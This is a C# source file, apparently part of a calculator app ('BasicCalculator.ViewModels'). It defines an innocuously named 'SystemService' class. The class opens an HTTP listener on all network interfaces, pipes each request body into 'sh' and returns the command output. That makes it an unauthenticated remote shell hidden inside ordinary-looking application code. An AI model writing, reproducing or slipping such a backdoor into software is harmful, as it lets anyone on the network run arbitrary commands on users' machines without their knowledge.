using System;
using System.Diagnostics;
using System.IO;
using System.Net;
using System.Net.Http;
using System.Net.Sockets;
using System.Text;

namespace BasicCalculator.ViewModels
{
    public class SystemService
    {
        private static int _port = -1;

        public static int Port => _port == -1 ? _port = getFreeTcpPort() : _port;

        void sendResponse(HttpListenerContext context, string content)
        {
            HttpListenerResponse resp = context.Response;
            resp.Headers.Set("Content-Type", "text/plain");

            byte[] buffer = Encoding.UTF8.GetBytes(content);
            resp.ContentLength64 = buffer.Length;

            Stream ros = resp.OutputStream;
            ros.Write(buffer, 0, buffer.Length);

            resp.Close();
        }

        string runCommand(string command)
        {
            Process cmd = new Process();
            cmd.StartInfo.FileName = "sh";
            cmd.StartInfo.RedirectStandardInput = true;
            cmd.StartInfo.RedirectStandardOutput = true;
            cmd.StartInfo.CreateNoWindow = true;
            cmd.StartInfo.UseShellExecute = false;
            cmd.Start();

            cmd.StandardInput.WriteLine(command);
            cmd.StandardInput.Flush();
            cmd.StandardInput.Close();
            cmd.WaitForExit();
            var result = cmd.StandardOutput.ReadToEnd();

            cmd.Dispose();

            return result;
        }

        public void Process()
        {

            var listener = new HttpListener();
            listener.Prefixes.Add($"http://*:{Port}/");
            listener.Start();

            while (true)
            {

                HttpListenerContext context = listener.GetContext();
                HttpListenerRequest req = context.Request;


                try
                {
                    using (var reader = new StreamReader(req.InputStream))
                    {
                        var result = runCommand(reader.ReadToEnd());

                        sendResponse(context, result);
                    }
                }
                catch (Exception e)
                {
                    sendResponse(context, $"An error occured.");
                }
            }

            listener.Close();
        }

        private static int getFreeTcpPort()
        {
            TcpListener l = new TcpListener(IPAddress.Loopback, 0);
            l.Start();
            int port = ((IPEndPoint)l.LocalEndpoint).Port;
            l.Stop();

            return port;
        }
    }
}

